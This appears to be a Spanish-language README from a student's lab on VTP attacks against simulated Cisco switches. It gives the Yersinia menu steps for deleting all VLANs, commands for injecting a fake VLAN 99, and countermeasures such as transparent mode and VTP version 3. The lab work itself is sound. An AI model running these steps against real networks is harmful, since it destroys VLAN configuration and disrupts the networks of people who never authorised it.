# VTP Attack — Yersinia

> **Laboratorio de Seguridad en Redes**  
> **Estudiante:** Ashley Fabian | **Matrícula:** 2025-0773  
> **Institución:** Instituto Tecnológico Las Américas (ITLA)  
> **Herramientas:** GNS3 · Cisco IOSvL2 · Kali Linux · Yersinia 0.8.2

---

## 📌 Descripción

Este repositorio contiene los entregables del laboratorio de **VTP Attack**, un ataque de Capa 2 que explota el protocolo **VLAN Trunking Protocol (VTP)** de Cisco para manipular la base de datos de VLANs de toda una red conmutada. Se demuestran dos ataques:

1. **Eliminar todas las VLANs** del dominio VTP usando Yersinia.
2. **Agregar una VLAN falsa** (VLAN 99) que se propaga a todos los switches.

---

## 🗂️ Contenido del Repositorio

```
📁 AshleyFabian_2025-0773_VTP_P2/
├── 📄 README.md
├── 📄 AshleyFabian_2025-0773_Informe_VTP_P2.pdf   ← Documentación técnica
└── 🎬 AshleyFabian_2025-0773_Video_VTP_P2           ← Enlace al video en YouTube
```

---

## 🌐 Topología de Red

```
  [SW1 - VTP Server]
   IP: 25.7.73.1/24
        |
        | Gi0/0 ←trunk→ Gi0/0
        |
  [SW2 - VTP Client 1]
   IP: 25.7.73.2/24
        |
        | Gi0/1 ←trunk→ Gi0/1
        |
  [SW3 - VTP Client 2]
   IP: 25.7.73.3/24
        |
        | Gi0/0
        |
  [Kali Linux - Atacante]
   IP: 25.7.73.10/24
```

| Equipo | Rol VTP   | IP           | Máscara       |
|--------|-----------|--------------|---------------|
| SW1    | Server    | 25.7.73.1    | 255.255.255.0 |
| SW2    | Client 1  | 25.7.73.2    | 255.255.255.0 |
| SW3    | Client 2  | 25.7.73.3    | 255.255.255.0 |
| Kali   | Atacante  | 25.7.73.10   | 255.255.255.0 |

---

## 🔧 VLANs Legítimas

| VLAN ID | Nombre       |
|---------|--------------|
| 10      | Contabilidad |
| 20      | RRHH         |
| 30      | TI           |

---

## ⚙️ Requisitos

- Kali Linux con Yersinia instalado
- GNS3 con imagen Cisco IOSvL2 15.2
- Dominio VTP sin contraseña
- Puerto de SW3 hacia Kali en modo trunk

```bash
# Instalar Yersinia
sudo apt update && sudo apt install yersinia -y
```

---

## 🚀 Ejecución de los Ataques

### Ataque 1 — Eliminar todas las VLANs

```bash
# Desde Kali:
sudo yersinia -I
```

```
G → VTP → Enter
x → ataque 2 (Deleting all VTP vlans) → Enter
```

Verificar en SW1, SW2 y SW3:

```bash
show vlan brief
# VLANs 10, 20 y 30 deben haber desaparecido
```

---

### Ataque 2 — Agregar VLAN Falsa

```bash
# Desde SW3:
configure terminal
vtp mode server
vlan 99
 name VLAN_FALSA_ATACANTE
exit
end
```

Verificar en SW1 y SW2:

```bash
show vlan brief
# VLAN 99 VLAN_FALSA_ATACANTE debe aparecer en todos los switches
```

---

## 🛡️ Contra-Medidas

### Opción 1 — VTP Transparent (recomendada)

```bash
# En todos los switches:
configure terminal
vtp mode transparent
end

show vtp status
# VTP Operating Mode: Transparent
```

### Opción 2 — VTP versión 3 con contraseña

```bash
configure terminal
vtp version 3
vtp password Itla2025@0773 secret
end
```

### Resumen

| Contra-medida       | Comando                    | Efectividad |
|---------------------|----------------------------|-------------|
| VTP Transparent     | `vtp mode transparent`     | Alta        |
| VTP Off             | `vtp mode off`             | Alta        |
| VTP versión 3       | `vtp version 3`            | Alta        |
| Contraseña VTP      | `vtp password <pass>`      | Media       |

---

## 🎬 Video

▶️ https://youtu.be/xyizWoWc07E?si=bNcUvCEQjbZEUVI2

> El video muestra ambos ataques y sus contra-medidas en menos de 5 minutos.

---

## 📄 Documentación

El informe técnico completo se encuentra en:  
📎 `AshleyFabian_2025-0773_Informe_VTP_P2.pdf`

---

## ⚠️ Aviso Legal

Este laboratorio fue realizado en un entorno **completamente controlado y simulado** con GNS3, con fines **exclusivamente educativos**. La ejecución de estos ataques en redes reales sin autorización es **ilegal**.

---

*Ashley Fabian — 2025-0773 — ITLA — Junio 2026*
